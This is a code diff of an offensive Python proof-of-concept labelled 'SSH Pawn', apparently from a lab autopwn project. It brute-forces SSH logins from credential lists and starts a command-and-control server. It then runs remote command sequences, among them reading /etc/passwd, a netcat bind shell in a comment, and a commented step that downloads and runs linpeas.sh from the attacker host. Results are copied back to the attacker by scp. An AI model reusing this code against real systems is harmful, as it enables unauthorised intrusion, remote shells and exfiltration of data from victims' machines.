@@ -2,6 +2,10 @@
 from pathlib import Path
 from subprocess import run, PIPE
 import paramiko
+from sys import argv
+from post.postexploit import openCtrlSrv
+from autopwn import flushProcesses
+import sequences as s
 
 def processList(inp = "")->list:
     """ Function that process lists txts in lists. """
@@ -34,7 +38,7 @@ def getSshCredsAndConn(ulist="",plist="",domain="")->tuple[(str,str)]:
             break
     return (retUsr,retPass)
 
-def autoSshPawn(usr,password,host,sequence)-> None:
+def autoSshPawn(usr,password,host,sequence)-> int:
     """ Take ssh credentials to connect and remotely runs\\
         instructions on target machine. """
     ssh = paramiko.SSHClient()
@@ -47,16 +51,45 @@ def autoSshPawn(usr,password,host,sequence)-> None:
     
     print(f"Pawning machine through SSH ...")
     for instruction in sequence:
-        print(f"Remote execution -> {instruction}")
+        print(f"[Command] {instruction}")
         stdin, stdout, stderr = ssh.exec_command(instruction,timeout=30) # nc -l -p 55555 -e /bin/bash')
-        print(stdout.read().decode("utf8"))
-    exit(0)
+        print(f"[Output] "+ stdout.read().decode("utf8"))
+    return 0
 
-    
-# usr,pwd = getSshCredsAndConn(ulist="./init/userlist",plist="./init/passlist",domain="192.168.1.45")
-# print(f"Credentials user = {usr} | password={pwd}")
-# autoSshPawn(usr,pwd,"192.168.1.45",['whoami',
-#                                     'pwd',
-#                                     'ls -la',
-#                                     'cat /etc/passwd',
-#                                     'getent group sudo'])
+
+
+if __name__ == "__main__":
+
+    flushProcesses()
+
+    print("*** POC : SSH Pawn ***")
+
+    attackAddr = '192.168.1.86'
+    attacker="test"
+
+    if len(argv) > 1:
+        target = argv[1]
+    else:
+        target = '192.168.1.188'
+        
+    usr,pwd = getSshCredsAndConn(ulist="./init/userlist",plist="./init/passlist",domain=target)
+
+    if usr and pwd:
+        print(f"Credentials user = {usr} | password={pwd}")
+        proc, port = openCtrlSrv(bindaddr=attackAddr)
+        srv = f"{attackAddr}:{port}"
+        print(f"Command and Control server @{srv} !")
+
+        # sequence = ["whoami",
+        #             "pwd",
+        #             "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
+        #             "chmod +x linpeas.sh",
+        #             "./linpeas.sh > ./linout"]
+        
+        autoSshPawn(usr,pwd,target,s.SEQUENCE_0)
+
+        print(f"[Local command] scp {usr}@{target}:/home/vargant/linout .")
+        proc = run(f"scp {usr}@{target}:/home/vagrant/linout {attacker}@{attackAddr}:.",shell=True)
+
+        print(f"*** End of POC ***")
+        exit(0)
